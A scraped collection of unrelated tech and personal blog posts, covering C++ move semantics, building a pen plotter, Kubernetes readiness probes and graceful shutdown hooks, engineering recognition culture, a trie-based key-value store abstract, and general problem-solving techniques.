<p>In these two articles: <a href="https://eli.thegreenplace.net/2011/12/15/understanding-lvalues-and-rvalues-in-c-and-c">Understanding lvalues and rvalues in C and C++ </a> and <a href="http://eel.is/c++draft/basic.lval#1">basic.lval#1</a>, value categories are explained in detail<sup>2</sup>. In brief, quoting from the first article: “An lvalue (locator value) represents an object that occupies some identifiable location in memory. Rvalue is an expression that does not represent an object occupying some identifiable location in memory.”. Of course, there are more categories than just a <code>lvalue</code> and a <code>rvalue</code>. I would highly recommend reading both articles. Though you don’t need a perfect grasp of them to understand what comes later in this article. Let’s get back to our original example and analyze why the move constructor was called.</p>

<div><div><pre><code><span>// main.cpp</span>
<span>while</span> <span>(</span><span>displayOn</span><span>)</span> <span>{</span>
    <span>...</span> 
    <span>const</span> <span>auto</span> <span>disp_pixels</span> <span>=</span> <span>emulator</span><span>.</span><span>get_display_pixels</span><span>();</span>
    <span>...</span>
    <span>// Use disp_pixels to draw pixels on the screen</span>
<span>}</span>
</code></pre></div></div>
<p>In the above code snippet, the function call to <code>get_display_pixels</code> belongs to the <code>rvalue</code> (more precisely a <code>prvalue</code>) category and it generates a temporary. The compiler can now safely <code>move</code> that temporary into the <code>disp_pixels</code> variable because that temporary will be destroyed anyway after this statement. If the type that is being returned does not have a move constructor (in our case <code>std::array</code> has a move constructor), then the compiler will call the <code>copy constructor</code>.</p>

<p>In principle, if any of the <code>moveable</code> types (standard or user-defined) is returned from a function by <code>value</code>, we can safely assume either <code>NRVO</code> or <code>move operation</code> will take place resulting in no superfluous copies for standard compilers that support <code>C++11</code> and above.</p></div></article></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/p2mess_zoom_hu8e325a65af689050d72be44b66a03b9f_716964_636x0_resize_q75_box.jpg" alt="Penrose P2 mess" data-zoom-src="/posts/pen-plotter/images/p2mess_zoom.jpg" data-zoomable=""><figcaption>Penrose P2 mess</figcaption></figure><p>For the last ~2 years, I’ve been making generative art. So far, it’s been bad for my health, wallet, sanity and general focus. I enjoy creating complex, emergent, generative content that makes your eyeballs perplexed and lost for a while until you figure out simple rules that are used to make it.</p><p>It all started when I was looking for a new toy project to write in the Rust programming language (which, itself, is super neat. Fighting with the borrow checker is 10/10 experience). I decided to make it draw pretty, silly things. Initially, I played with particles being affected by fields, which resulted in stuff like this:</p><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/star1_hu48a0a69b33a045876d91b7df7bdcad4f_1955328_636x0_resize_q75_box.jpg" alt="Particles trails, a lot of particles" data-zoom-src="/posts/pen-plotter/images/star1.jpg" data-zoomable=""><figcaption>Particles trails, a lot of particles</figcaption></figure><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/mantis_hudef7f76de08ea44bcc0eee363c479bae_2166917_636x0_resize_q75_box.jpg" alt="Particles trails, wobbling up and down" data-zoom-src="/posts/pen-plotter/images/mantis.jpg" data-zoomable=""><figcaption>Particles trails, wobbling up and down</figcaption></figure><p>Then, predictably, I got bored. Some time afterwards, I randomly found the art of <a href="http://robertfathauer.com/">Robert Fathauer</a> and I was mesmerized. <a href="http://robertfathauer.com/6FoldFTiling.html">6Fold Tiling</a> is a print made with a laser-cut woodblock. I had an access to a laser cutter at my work. I found <a href="http://www.fractalcurves.com/">Fractal Curves</a>, which is a great resource if you’re looking for funky, self-similar, fractal shapes. I played with <a href="http://www.fractalcurves.com/Root3.html">Terdragon</a> curve a bit. It’s a magnificent beast, can be tiled, it’s self avoiding, and the legend says it was found by Donald Knuth. I came up with some neat tesselations, burned two design plywood sheets with differing iteration steps. The results were quite pleasing. I did not stop there, and made a few other designs.</p><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/terdragons_hu27f7dc34c9db8fd2b063f3fba6be9864_314128_636x0_resize_q75_box.jpg" alt="Printing with laser-etched plywood" data-zoom-src="/posts/pen-plotter/images/terdragons.jpg" data-zoomable=""><figcaption>Printing with laser-etched plywood</figcaption></figure><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/IMG_20190227_192650_hub9bcfbd7fbe079a33acfd2e29bcc3094_526602_636x0_resize_q75_box.jpg" alt="L-system based design made with woodblock printing" data-zoom-src="/posts/pen-plotter/images/IMG_20190227_192650.jpg" data-zoomable=""><figcaption>L-system based design made with woodblock printing</figcaption></figure><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/MVIMG_20190227_194557_hu6c91ec9686bdb0086c368885c2bfcfd0_490600_636x0_resize_q75_box.jpg" alt="Another L-system, a &quot;recurrent mean frog&quot;" data-zoom-src="/posts/pen-plotter/images/MVIMG_20190227_194557.jpg" data-zoomable=""><figcaption>Another L-system, a "recurrent mean frog"</figcaption></figure><p>Sadly, laser-cut woodblock printing is very laborious and requires access to a beefy laser cutter. It’s fun from time to time, but I can’t see me doing it as a hobby. But, pen plotters! They have an active and healthy community of artists and hackers doing marvellous <a href="https://twitter.com/hashtag/plottertwitter">things</a> with them. They are usually built with mechanicals lifted from recent 3d printers. Steppers, Arduino, v-slots, etc. I got myself an EleksMaker EleksDraw pen plotter.</p><p>And I was very happy with it. It’s mesmerizing to watch. I used it mostly to generate some squiggles based on Penrose P2 tiling, some 3d renders using Michael Fogleman excellent <a href="https://github.com/fogleman/ln">ln art engine</a>, and some spirals.</p><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/IMG_20191113_200736_hu60a10dbc35e8b7122d3fdacc3a0ec497_1353701_636x0_resize_q75_box.jpg" alt="&quot;Squeres on Cubes&quot;" data-zoom-src="/posts/pen-plotter/images/IMG_20191113_200736.jpg" data-zoomable=""><figcaption>"Squeres on Cubes"</figcaption></figure><p>But I had this urge to go larger with my work. Obviously, larger == better :). I upgraded the long axis of EleksDraw with longer rails, but it made it very difficult to use. I blame gravity and my lack of understanding of physics. When extended to the furthest position, the penholder was sagging too low. When near, it was too high. Pen drops from large height are very unkind toa pen tip. I had to write down a special, slow pen up/down sequence that was making the plotting process painfully slow. Because of that, I started making a lot of single-line plots.</p><p>Recently I acquired a shed in my garden, It was an ideal excuse to go wild with my pen plotter obsession.</p><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/PXL_20200710_120008520_hu618f6de8682f0d9213d6858de3a74c01_525666_636x0_resize_q75_box.jpg" alt="The Shed.

Yellow skinned, weirdly haired presence in my garden</figcaption></figure><p>I decided to build a plotter using <a href="https://openbuilds.com/builds/openbuilds-acro-system.5416/">OpenBuilds Acro</a> 150x100 frame. I ordered one from <a href="https://ratrig.com/">RatRig</a>, and most of the electronics from <a href="https://ooznest.co.uk/">ooznest</a> (extremely reliable company, fast shipping times, but that’s probably because they are located fairly close :D). I cut down an MDF board to size, assembled the whole thing, connected motors to GRBL Arduino shield.</p><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/PXL_20200710_115940029_hu7fa27841d7f828a81e5890bf4d723758_978081_636x0_resize_q75_box.jpg" alt="The Plotter.

Because of it's size, and terrible cabling, it has been nicknamed 'Your mom'</figcaption></figure><p>Then I got some hard lessons on how steppers work. They do vibrate, that’s what they do. I spend multiple days trying to figure out if the problem is exacerbated by the frame, loose belts, steppers, wiring or electronics.</p><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/PXL_20200704_183342254_hucd8e8854f91f1da0f86932b0da09896d_84429_636x0_resize_q75_box.jpg" alt="Y axis wobbling.

At low speeds, steepers were vibrating like excited toddlers</figcaption></figure><p>After a painful and long inspection, I found a culprit, it was <a href="https://ooznest.co.uk/product/drv8825-stepper-motor-driver/">DRV8825</a> stepper drivers. I got them because of their 1/32 microstepping and high current output. Apparently, using them is a bit like a lottery, either they work with your steppers without a problem, or they are a pain in the ass.</p><p>I had more luck with <a href="https://ooznest.co.uk/product/a4988-stepper-motor-driver">A4988</a> steppers, they were more reliable, and the wibbling decreased. But was still present, unless I limited the current to silly levels.</p><p>Then I got <a href="https://shop.watterott.com/SilentStepStick-TMC2209-Stepper-Motor-Driver">TMC2809</a> based drivers from Watterott. They are worth their weight in gold. Really smooth, motors are silent, there’s no wobbling.</p><p>Just in case, and to get better performance with higher speeds, I got myself some <a href="https://www.oriental-motor.co.uk/Products/Stepper_motors/Accessories/Accessories/Dampers/">clean dampers</a>, but they will have to wait for some dual-shaft steppers, so I can mount them easily.</p><p>This is the first A2 work I finished. I’m quite proud.</p><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/PXL_20200712_183148014_hu4e6e62bba50aeabbea985434601a816f_405040_636x0_resize_q75_box.jpg" alt="Human growth #1" data-zoom-src="/posts/pen-plotter/images/PXL_20200712_183148014.jpg" data-zoomable=""><figcaption>Human growth #1</figcaption></figure><figure><img src="http://blog.pzs.me/posts/pen-plotter/images/PXL_20200710_203221728_hudeaf633ca98413b9db1e5465eeaf09e0_436891_636x0_resize_q75_box.jpg" alt="P2 tiling hatching" data-zoom-src="/posts/pen-plotter/images/PXL_20200710_203221728.jpg" data-zoomable=""><figcaption>P2 tiling hatching</figcaption></figure></div></div>]]>

<p>In any disagreement, no matter how respectful it is, each person has 4 options at any given time:</p>



<ol><li>Continue discussing it</li><li>Stop discussing it because the value of convincing the other person isn’t worth the time and effort</li><li>Stop discussing it out of fear of conflict or of the other person liking you less if you keep at it</li><li>Stop discussing it because you accept that you’re wrong</li></ol>



<p>Option 1 people have a higher threshold for when to stop arguing, relative to the people they argue with. Either they’re very persuasive or, more often, they’re good at wearing people down until they give up. They can be difficult, and sometimes downright toxic. I’m sure you can think of some option 1 people you’ve dealt with. </p>



<p>Option 2 people give up because it’s not worth their time. Sometimes option 2 people are just busy or pragmatic, but often I find that option 2 situations say more about the winner than the conceder. If you encounter lots of option 2 people, maybe you have a reputation of being an option 1 person so people have given up on productive discussions with you.</p>



<p>Option 3 people probably don’t like conflict or awkward conversations. I am an option 3 person. I <a href="https://critter.blog/2020/08/13/clear-is-kind-unclear-is-unkind/">wrote about that a bit here</a>. Option 3 people are tough because if they back down, it’s hard to tell they’re actually convinced or just uncomfortable and trying to be polite.</p>



<p>Option 4 people either like to play devil’s advocate and purposely pick the losing side, or hold strong opinions loosely and are willing to be proven wrong. Option 4 people pursue truth and growth over ego and being right. I strive to be an option 4 person. </p>



<p>I think there’s a lot of value in identifying which type you are, and telling your friends/coworkers/partner. So which type are you? Or am I totally off? <a href="https://twitter.com/mcrittenden">Tweet at me</a> and let me know.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>Disclaimer:</strong> Don’t dab if you have epilepsy.</p>
<h2 id="dab-detector">Dab detector</h2>
<p>This is a simple experiment playing around with <a href="https://ml5js.org/" rel="nofollow noopener noreferrer" target="_blank">ml5.js</a>. It uses the PoseNet model to recognize when you <a href="https://en.wikipedia.org/wiki/Dab_(dance)" rel="nofollow noopener noreferrer" target="_blank">dab</a> and shows you a little surprise when you do.</p>
<p>To use it, make sure you are in a well <span title="💯😂👌💯">lit</span> environment, accept the camera use request, and stand up so that your whole body shows in the image.</p>
<h2 id="how-does-it-work">How does it work?</h2>
<p>It uses PoseNet, a ml5 model for Real-time Human Pose Estimation. With the data provided by the model, it preforms a really simple check to see if the pose should count as a Dab. It works by checking if the right hand is close to the left ear, and the angles of the elbows are above or under a specified threshold. Vice-versa for the left side. This is a very naive approach, and it wasn’t what I originally intended to do, but after implementing this as a prototype, I realized it worked much better than expected. You can see the function used in the code below, called <code>isPoseADab()</code>.</p>
<p>My plan was to train a simple categorization model using ml5, so it’s a bit of a shame that it doesn’t now. I intend to make some other experiment that does use that feature.</p>
<p>The video, skeleton and emojis are drawn using the <a href="https://p5js.org/" rel="nofollow noopener noreferrer" target="_blank">p5.js</a> rendering library, which works really well next to ml5.</p>
<h2 id="why">Why?</h2>
<p>Uuuhhh... Because my sense of humor got stuck a couple years ago and I non-ironically think this is funny. </p>
<p>In all seriousness, because I wanted to try something with pose recognition, and the first pose that came to mind that was interesting was a Dab.</p></div></div>]]>

<p><em>Reward the behavior you seek</em></p>



<p>In the fable “The Golden Axe,” a woodcutter accidentally drops his axe in a river, losing his only means of support. The god Hermes takes pity on him and retrieves a golden axe from the river. The woodcutter replies that it was not his axe, so Hermes returns with a silver axe. Once again, the woodcutter says that axe was not his. The woodcutter only accepts when the god returns with his actual, lowly axe. Hermes, impressed with the woodcutter’s honesty, gives him all three axes.</p>



<p>When the woodcutter’s neighbor hears what had passed and covets the first woodcutter’s new wealth (golden axes apparently being worth quite a lot on the open market), he throws his own axe into the river to try to reap the same rewards. Hermes comes with a golden axe, which the neighbor claims is his. Hermes punishes his dishonesty by depriving him of the golden axe, the silver axe, and his own original axe.</p>



<hr>



<p>Picture an engineering team. One engineer, either by choice or by mediocre management, spends most of their time paying down technical debt, making proactive improvements to tooling and infrastructure, and building out low-friction ways to add monitoring for production applications.</p>



<p>Meanwhile, another engineer on the same team always seems to get the new, shiny projects to work on: the high visibility features, the highly-touted initiative to “increase engineering velocity” by breaking an application monolith into microservices (to be followed in a year by an equally-touted initiative to merge those microservices back into a monolith), or the fancy new customer product.</p>



<p>Both engineers may be equally skilled and work just as hard, but which one do you think will get the lion’s share of recognition? (If you answered, “The one doing critical glue work,” you either work in a singular organization or you’re seriously out of touch with reality.) And what happens when a new engineer joins the team? Someone who is neither a total narcissist who needs constant adoration nor a masochist who likes to suffer? After seeing the pattern of which engineer gets the public accolades, which behavior do you think they will more likely emulate? The one the team treats as most valuable, of course.</p>



<p>I worked at a company where anyone could nominate a co-worker for demonstrating one of the company “values.” Recipients would get recognized at company all-hands meetings. Let’s see if you can spot a problem here.</p>



<p>Customer success nominates an engineer who helped them troubleshoot a customer-facing problem. Hey, that sounds important, right?</p>



<p>Okay, but what if I tell you that that engineer was the one who pushed the code that broke the service in the first place? Um, well, you don’t want to punish engineers for making mistakes, right? Of course not, but do you really want to give them a t-shirt when they do?</p>



<p>What if I tell you that same engineer had ignored warnings in staging that indicated there were likely performance issues? (In the real-life version of this story, when I sent links to monitoring graphs to ask why we were seeing elevated values for Java heap usage, he replied that the QA team was probably running tests. “Did you ask them?” Crickets. Why didn’t I escalate before the deployment? Ask our common manager at the time what <em>my</em> reward tended to be when I tried to push for the product dev teams to take responsibility for their components’ quality and performance before it got pushed to production.)</p>



<p>The customer success team member who nominated him for helping out during the customer-facing issues did not know the issue’s backstory, though. This recognition system, while not intentionally built to reward “bad” behavior, had no guardrails to prevent rewarding counterproductive habits, either.</p>



<p>Meanwhile, another engineer might deliver a feature that sales can’t really hype to customers and marketing can’t really spin. The code goes live and nothing breaks. Crickets. On the one hand, yes, that engineer did their job and did it correctly. However, an engineer doing troubleshooting, whether for an issue they create in the first place or not, is also doing their job. Again, why does one engineer get recognized and the other does not?</p>



<p>“Human nature” and a number of cognitive biases come into play. We become habituated to things that maintain a predictable state or cadence. We only notice when they stop working, even though that long-lived steady state of reliable functionality required consistent effort behind the curtain to maintain. And of course, new features correlate more strongly with money in the psychology of tech companies. While that association holds some truth, specifically a prominently accepted truth, it’s not the <em>only</em> truth. Quality, service availability and reliability, the ability to maintain engineering development velocity, writing internal documentation: the company cannot bill customers directly for these functions, but try running a sustainable, efficient company without at least some of them. (And many, many, many startups do try to do just that.)</p>



<p>Try this: reward the behavior you seek. And the implicit, but often overlooked, corollary: don’t reward behavior that is, or could easily become, detrimental.</p>



<p>A robust system of positive feedback requires another variable: the difference between publicly rewarding someone compared to privately validating their work.</p>

<p>If you want to encourage healthy behaviors, such as writing internal documentation or onboarding new engineers, as a basis for your engineering culture, recognize them in a public forum. Giving only a private thank-you, while better than nothing, can send a subliminal message to the recipient that, yes, they did something beneficial, but it’s not really something to be proud of. And because the acknowledgement is private, no one else gets the message that the team and company deeply value this kind of effort.</p>



<p>However, you still need to be careful here with what you openly reward. If you constantly publicly recognize someone for putting in overtime, for example, you create the expectation, whether you intend to or not, that to get recognized, an engineer has to work much longer hours. Maybe you and your company want and expect that, but don’t come crying to me when your Glassdoor reviews all talk about burnout from being expected to work long hours. If you do genuinely want to create a culture and company with sustainable work practices, call out quality over quantity, value over volume, practical over pretty. </p>



<p>On another side of encouraging healthy efforts, all engineering teams face some amount of work which, while it must get done, should not be presented or encouraged as “normal,” let alone ideal. “Unplanned” work comprises most, if not all, of this category in most organizations, usually in the form of troubleshooting outages or of other “waterfall” tasks that, for one reason or another, were not the result of otherwise standard proactive planning and prioritization, even in a team that claims to follow Agile methodologies.</p>



<p>For any given instance of these suboptimal tasks, obviously the people who worked on them need to be acknowledged. However, they should be thanked privately, to avoid the normalization of disruptive work within the rest of the team and the company as a whole.</p>



<p>Truly healthy organizations will go beyond thanking the individuals left to work on waterfall tasks. Teams genuinely focused on improvement should respond by making real effort to change or prevent whatever cultural or less-than-ideal management or cross-team dynamics ultimately create these “surprise” (which should really surprise no one who pays attention) situations. Working to minimize or eradicate disruptive work not only increases team efficiency and health over time, it represents a much more genuine acknowledgement of engineers and the value of their time and effort than a thank-you note or yet another company t-shirt can.</p>



<p>You also want to avoid creating a culture of “heroes.” Start by minimizing the occurrence of catastrophic events wherein someone needs to save the day. However, even major projects can create breeding grounds for hero worship. Make sure any forms of public recognition note the wider team context of these efforts. Nothing ever gets done in a true vacuum. Even if one engineer did most of the work for a given project, presumably other team members were taking up the slack as their peer’s time was allocated elsewhere. Also remember and remind your team that not all projects are going to be high-profile “game changers,” but someone will still need to do the work. You don’t want to make people who work on smaller, but still vital, projects to feel less important, and you don’t want to encourage the creation of marquee, but ultimately less valuable, work because you’ve sent the message that those projects and the people who work on them are more important.</p>



<p>Unfortunately, this culture of rewarding people who “create” new shinies, even though maintaining old rusties was more critical and valuable to the company, exists all over. And I have countless examples for my time at Yahoo! alone at how it tends to be both a symptom and an accelerator of an unhealthy, moribund, and highly-politicized company culture.</p>



<p>If you want to create a culture where people do the right thing and do it well, start by learning to recognize what the right thing is. Sometimes it’s better to create something new while sometimes, probably more often, maintaining the current system is both more critical and a better investment, at least for the near future. Then make sure engineers who focus on what’s best over what’s exciting get the recognition they deserve, both for the work they do and for the ability to see the difference.</p>



<p>Unless you reward the behavior that provides real engineering and company value, instead of counterproductive …</p></div></div>

            <p>There has been a lot of work going on in Core Customer over the last few months to migrate our OIDC/OAuth2 identity service from our tactical container platform to on-premises Kubernetes clusters. I’ve spoken about our homebrew container platform (Corbenetes) before, but here’s the essentials.</p>

<blockquote>
  <p>We built a container platform using Chef and Docker as a stepping stone to Kubernetes. It utilised our existing apps-on-virtual-machines deployment and operational patterns, and so this allowed Software Engineers to develop their applications in a cloud-native manner in a familiar way, and without needing to use the (at the time) brand new Kubernetes platform.</p>

  <p>Now we have a very high level of confidence in said new Kubernetes platform, we are migrating projects over and decommissioning our middle-ground solution.</p>
</blockquote>

<p>The migration actually went a lot smoother than we anticipated, especially seeing as this is the first large-scale service we have built on Kubernetes. One thing we hadn’t initially accounted for was the different ways in which health checks would be used by the underlying platform to detect whether or not traffic should be sent to a specific container. For some context, our current Corbenetes architecture looks similar to the below with one traefik container and two app containers per host (alongside a number of supporting containers for logging and metrics that aren’t shown here).</p>

<p><img src="https://sbg.technology/images/zero-downtime-kubernetes/corbenetes_architecture.png" alt=""></p>

<p>Traefik acts as a proxy, handling both TLS-termination and sending requests to the two backends that are available on the host. The upstream load balancer examines the health endpoints of the applications (via traefik) as well as traefik’s own <code>/ping</code> endpoint. When we do a restart of the application as part of a release, we stop traefik, which allows existing connections to the application to clear down, and takes it out of service in the load balancer so no further requests are sent to this host. Once the applications have finished dealing with their requests, they too are closed down. Because of this, the shutdown of the application itself doesn’t need to be the cleanest, as by the time it receives the shutdown signal there are no requests being served by it.</p>

<p>The following image shows our current architecture now we’re on Kuberbetes, again very high level. We have traefik and app Pods, each exposed with a Service (essentially a cluster of Pods and a policy allowing access to them). The traefik Service is exposed outside the cluster to allow incoming connections from the load balancer, and we make use of the Ingress resource to direct traffic destined for specific URLs to the app backend Service.</p>

<h2 id="how-kubernetes-handles-health-checks">How Kubernetes handles health checks</h2>

<p>Our health checks are defined as part of our Deployment manifest, for both traefik and the application. Initially we used the same health check endpoints as we had been using previously. Our manifest looked a little like this.</p>

<h3 id="traefik">traefik</h3>

<div><div><pre><code>livenessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 80
    scheme: HTTP
  initialDelaySeconds: 10
  periodSeconds: 5
readinessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 80
    scheme: HTTP
  periodSeconds: 5
</code></pre></div></div>

<h3 id="application">application</h3>

<div><div><pre><code>livenessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 8081
    scheme: HTTP
  initialDelaySeconds: 10
  periodSeconds: 5
readinessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 8081
    scheme: HTTP
  periodSeconds: 5
</code></pre></div></div>

<p>This seemed to work out alright. Our Pods were up and running when we expected them to be, and when we force stopped the application, the health check went bad and the Pod was deleted. It was at this point we started doing extensive performance testing of the application on this new platform. We noticed an issue with cold starts. It appeared that the first time a non-health check request was made to each application Pod, the response time was around <strong>six seconds</strong>. The was obviously a suboptimal situation, and another reason why we do lots of performance testing using production-like load profiles.</p>

<p>After this first slow response, the application was absolutely fine. Turns out that the application doesn’t compile its JavaScript components until the first page load.</p>

<h2 id="its-alive-but-is-it-ready">It’s alive, but is it ready?</h2>

<p>It’s almost as though the team that built Kubernetes knew this would be a thing, as they specifically define both a <code>livenessProbe</code> and a <code>readinessProbe</code> that can be applied to the Pods. Their <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/">own documentation</a> explains the difference between the two:</p>

<ul>
  <li><strong>livenessProbe</strong> defines when to restart a container, e.g. the <code>/ping</code> endpoint returns a bad response</li>
  <li><strong>readinessProbe</strong> defines when a container is ready to start accepting traffic, e.g. a script has run to synchronise data in your stateful application</li>
</ul>

<p>In our case, we needed to change our <code>readinessProbe</code> to try and load the <code>/login</code> endpoint, and allow the application to be properly ready for accepting <strong>all</strong> traffic, not just health check traffic.</p>

<div><div><pre><code>readinessProbe:
  failureThreshold: 5
  httpGet:
    path: /login?client_id=auth_provider
    port: 8081
  initialDelaySeconds: 25
  periodSeconds: 10
  timeoutSeconds: 1
  successThreshold: 1
</code></pre></div></div>

<p>This was a great success. Each Pod took about 15 seconds longer to start, but that’s a small price to pay to be confident in the ability of the Pod to handle traffic straight away. We went back to our performance testing and low and behold… we still saw issues with dropped requests during an application release, or scale down of the Pods.</p>

<p>Something about how this application works did not appreciate the way in which Kubernetes was terminating it.</p>

<h2 id="let-me-down-gently">Let me down gently</h2>

<p>When Kubernetes decides that it needs to terminate a Pod (whether this be to evacuate a host, move things around for resource utilisation purposes, or just because there is change to the Deployment warranting the creation of new Pods) it sends a <code>SIGTERM</code> (graceful shutdown request) to PID 1 of the container and waits for up to thirty seconds. In our case, PID 1 was the <code>node</code> parent process.</p>

<p>Remember the way we used to stop the applications on Corbenetes? We’d cut them off from receiving new requests and then eventually stop the application itself. Because at a basic level there is no link in Kubernetes between the state of the application Pods, and the state of the traefik Pods, we can’t hide the application behind traefik any more.</p>

<p>Thankfully, we had a way around this. We could use the Kubernetes <a href="https://kubernetes.io/docs/concepts/containers/container-lifecycle-hooks/">container hooks</a> to implement a PreStop hook to do something <em>before</em> Kubernetes attempts to stop the container. We knew that straight killing the <code>node</code> parent was bad, even if it was graceful, so we experimented with the best way to gracefully terminate the container.</p>

<div><div><pre><code>lifecycle:
  preStop:
    exec:
      command: [
        "sh", "-c", "sleep 2 &amp;&amp; kill -15 $(pidof node | awk '{print $1}') &amp;&amp; sleep 2"
      ]
</code></pre></div></div>

<p>We ended up with this PreStop hook, which waits a couple of seconds, then sends a <code>SIGTERM</code> to the <code>node</code> child process, before waiting for another couple of seconds.</p>

<p>We went back to our performance tests and it was smoother than the proverbial. No matter how aggressively we were terminating Pods and restarting Deployments (the quickest way to test a release without actually releasing), we saw absolutely no degradation in service whatsoever.</p>

<p>This was all fine and dandy, but it taught us an important lesson: even if you are moving from one container-based platform to another, there is no such thing as a lift-and-shift. Each of them have their own nuances that need to be addressed. Now we know that Kubernetes is our standard, and we know how to handle zero-downtime deployments for our applications, we can properly spec out work in future, and not spend days chasing our tail trying to work out why it doesn’t just work.</p>

            <p>Indexes are essential in data management systems to increase the speed of data retrievals. Widespread data structures to provide fast and memory-efficient indexes are prefix tries. Implementations like Judy, ART, or HOT optimize their internal alignments for cache and vector unit efficiency. While these measures usually improve the performance substantially, they can have a negative impact on memory efficiency. In this paper we present Hyperion, a trie-based main-memory key-value store achieving extreme space efficiency. In contrast to other data structures, Hyperion does not depend on CPU vector units, but scans the data structure linearly. Combined with a custom memory allocator, Hyperion accomplishes a remarkable data density while achieving a competitive point query and an exceptional range query performance. Hyperion can significantly reduce the index memory footprint and its performance-to-memory ratio is more than two times better than the best implemented alternative strategy for randomized string data sets.</p>

<p>A lot of people don’t realize that there are general purpose problem solving techniques that cut across domains. They can help you deal with thorny challenges in work, your personal life, startups, or even if you’re trying to prove a new theorem in math.</p>



<p>Below are the 26 general purpose problem solving techniques that I like best, along with a one-word name I picked for each, and hypothetical examples to illustrate what sort of strategy I’m referring to.</p>



<p>Consider opening up this list whenever you’re stuck solving a challenging problem. It’s likely that one or more of these techniques can help!</p>



<h4>General Purpose Techniques for Solving Challenging Problems of All Kinds</h4>



<p>1. <strong>Clarifying</strong> – try to define the problem you are facing as precisely as you can, maybe by writing down a detailed description of exactly what the problem is and what constraints exist for a solution, or by describing it in detail to another person, which may lead to you realizing the problem is not quite what you had thought, or that it has a more obvious solution than you thought.</p>



<p>Life Example: <em>“I thought that I needed to find a new job, but when I thought really carefully about what I don’t like about my current job, I realized that I could likely fix those things by talking to my boss or even, potentially, just by thinking about them differently.”</em></p>



<p>Startup Example: <em>“we thought we had a problem with users not wanting to sign up for the product, but when we carefully investigated what the problem really was, we discovered it was actually more of a problem of users wanting the product but then growing frustrated because of bad interface design.”</em></p>



<p>2. <strong>Subdividing</strong> – break the problem down into smaller problems in such a way that if you solve each of the small problems, you will have solved the entire problem.</p>



<p>Startup Example:<em> “My goal is to get company Z to become a partner with my company, and that seems hard, so let me break that goal into the steps of (a) listing the ways that company Z would benefit from becoming a partner with us, (b) finding an employee at company Z who would be responsive to hearing about these benefits, and (c) tracking down someone who can introduce me to that employee.”</em></p>



<p>Math Example:<em> “I want to prove that a certain property applies to all functions of a specific type, so I start by (a) showing that every function of that type can be written as a sum of a more specific type of function, then I show that (b) the property applies to each function of the more specific type, and finally I show that (c) if the property applies to each function in a set of functions then it applies to arbitrary sums of those functions as well.”</em></p>



<p>3. <strong>Simplifying </strong>– think of the simplest variation of the problem that you expect you can solve that shares important features in common with your problem, and see if solving this simpler problem gives you ideas for how to solve the more difficult version.</p>



<p>Startup Example: <em>“I don’t know how to hire a CTO, but I do know how to hire a software engineer because I’ve done it many times, and good CTOs will often themselves be good software engineers, so how can I tweak my software engineer hiring to make it appropriate for hiring a CTO?”</em></p>



<p>Math Example: <em>“I don’t know how to calculate this integral as it is, but if I remove one of the free parameters, I actually do know how to calculate it, and maybe doing that calculation will give me insight into the solution of the more complex integral.”</em></p>



<p>4. <strong>Crowd-sourcing</strong> – use suggestions from multiple people to gain insight into how to solve the problem, for instance by posting on Facebook or Twitter requesting people’s help, or by posting to a Q&amp;A site like Quora, or by sending emails to 10 people you know explaining the problem and requesting assistance.</p>



<p>Business Example: <em>“Do you have experience outsourcing manufacturing to China? If so, I’d appreciate hearing your thoughts about how to approach choosing a vendor.”</em></p>



<p>Health Example: <em>“I have trouble getting myself to stick to doing exercise daily. If you also used to have trouble getting yourself to exercise but don’t anymore, I’d love to know what worked to make it easier for you.”</em></p>



<p>5. <strong>Splintering</strong> – if the problem you are trying to solve has special cases that a solution to the general problem would also apply to, consider just one or two of these special cases as examples and solve the problem just for those cases first. Then see if a solution to one of those special cases helps you solve the problem in general.</p>



<p>Startup Example: <em>“I want to figure out how to improve employee retention in general, let me examine how I could have improved retention in the case of the last three people that quit.”</em></p>



<p>Startup Example: <em>“I want to figure out how to convince a large number of people to become customers, let me first figure out how to convince just Bill and John to become customers since they seem like the sort of customer I want to attract, and see what general lessons I learn from doing that.”</em></p>



<p>6. <strong>Reading</strong> – read the books or textbooks that seems most related to the topic, and see whether they provide a solution to the problem, or teach you enough related information that you can now solve it yourself. </p>



<p>Economics Example: <em>“Economists probably have already figured out reasonable ways to estimate demand elasticity, let’s see what an econometrics textbook says rather than trying to invent a technique from scratch.”</em></p>



<p>Mental Health Example: <em>“I’ve been feeling depressed for a long time, maybe I should read some well-liked books about depression, such as ‘Feeling Good.'”</em></p>



<p>7. <strong>Searching </strong>– think of a similar problem that you think practitioners, bloggers or academics might have already solved and search online (e.g., via google, Q&amp;A sites, or google scholar academic paper search) to see if anyone has done a write-up about how they solved it.</p>



<p>Advertising Example: <em>“I’m having trouble figuring out the right advertising keywords to bid on for my specific product, I bet someone has a blog post describing how to approach choosing keywords for other related products.”</em></p>



<p>Machine Learning Example:<em> “I can’t get this neural network to train properly in my specific case, I wonder if someone has written a tutorial about how to apply neural networks to related problems.”</em></p>



<p>8. <strong>Unconstraining</strong> – list all the constraints of the problem, then temporarily ignore one or more of the constraints that make the problem especially hard, and try to solve it without those constraints. If you can, then see if you can modify that unconstrained solution until it becomes a solution for the fully constrained problem.</p>



<p>Startup Example: <em>“I need to hire someone who can do work at the intersection of machine learning and cryptography, let me drop the constraint of having cryptography experience and recruit machine learning people, then pick from among them a person that seems both generally capable and well positioned to learn the necessary cryptography.”</em></p>



<p>Computer Science Example: <em>“I need to implement a certain algorithm, and it needs to be efficient, but that seems very difficult, so let me first figure out how to implement an inefficient version of the algorithm (i.e., drop the efficiency constraint), then at the end I will try to figure out how to optimize that algorithm for efficiency.”</em></p>



